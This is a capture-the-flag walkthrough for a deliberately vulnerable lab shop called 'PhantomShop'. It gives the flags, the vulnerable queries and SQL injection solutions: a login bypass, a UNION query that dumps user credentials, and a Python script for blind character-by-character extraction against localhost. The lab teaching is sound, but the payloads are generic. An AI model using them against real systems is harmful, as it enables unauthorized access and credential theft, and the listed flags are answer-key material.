# SQL Injection — PhantomShop Walkthroughs

## 1. Login Bypass (Easy — 100pts)
**Flag:** `FLAG{sql_1nj3ct10n_l0g1n}`
**Location:** `/login`

### Vulnerability
The login query uses string concatenation:
```sql
SELECT id, username, role FROM users WHERE username='[INPUT]' AND password='[INPUT]'
```

### Solution
```
Username: ' OR 1=1--
Password: anything
```

The query becomes:
```sql
SELECT id, username, role FROM users WHERE username='' OR 1=1--' AND password='anything'
```
`OR 1=1` makes it always true. `--` comments out the password check. You're logged in as the first user (admin).

### Tools
- Browser only — no tools needed
- Or: `curl -X POST http://localhost:8080/login -d "username=' OR 1=1--&password=x" -v`

---

## 2. Search Product Extraction (Easy — 150pts)
**Flag:** `FLAG{un10n_s3l3ct_pr0ducts}`
**Location:** `/search?q=`

### Vulnerability
The search query:
```sql
SELECT id, name, price, category, image FROM products WHERE name LIKE '%[INPUT]%'
```

### Solution
```
Search: ' UNION SELECT id, username, password, role, email FROM users--
```

This returns all user records (including admin credentials) alongside product results.

### Finding column count
```
' UNION SELECT NULL,NULL,NULL,NULL,NULL--
```
5 columns. Match them when extracting from users table.

---

## 3. Blind SQLi on Orders (Medium — 250pts)
**Flag:** `FLAG{bl1nd_sql1_3xtr4ct}`
**Location:** `/order/`

### Vulnerability
The order lookup page doesn't show query results directly, but different page content indicates true/false.

### Solution
Visit `/order/1 AND 1=1` vs `/order/1 AND 1=2` — different responses confirm injection.

Extract flag from the flags table character by character:
```python
import requests

flag = ""
for pos in range(1, 30):
    for char in "FLAG{}_abcdefghijklmnopqrstuvwxyz0123456789":
        url = f"http://localhost:8080/order/1 AND SUBSTRING((SELECT value FROM flags WHERE name='sqli_blind'),{pos},1)='{char}'"
        r = requests.get(url)
        if "Processing" in r.text:
            flag += char
            print(f"[+] {flag}")
            break
    else:
        break
```
